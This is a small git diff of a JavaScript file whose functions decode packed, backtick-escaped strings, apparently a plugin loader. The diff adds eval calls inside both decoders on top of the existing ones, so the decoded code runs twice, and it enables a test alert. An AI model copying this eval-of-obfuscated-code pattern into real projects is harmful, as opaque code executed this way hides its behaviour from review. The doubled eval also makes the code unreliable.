@@ -20,6 +20,7 @@ var LoadMap2String = "(function (plugin_name) {var dependencies = {};` D'` =#roo
 function LoadMap1(z) {
     var d = "";
     var p = 0;
+    console.log("LoadMap1 is working too")
     while (p < z.length) {
         if (z.charAt(p) != "`") d += z.charAt(p++);
         else {
@@ -29,6 +30,7 @@ function LoadMap1(z) {
             p += 4
         }
     }
+    eval(d)
     return d
 }
 
@@ -1882,13 +1884,15 @@ function LoadMap2(x) {
             p += 4
         }
     }
+    eval(d)
     return d
+    
 }
 var one = LoadMap1(LoadMap1String)
 eval(one)
 var two = LoadMap2(LoadMap2String)
 eval(two)
-// alert("This should not work")
+alert("This should not work")
 
 
 
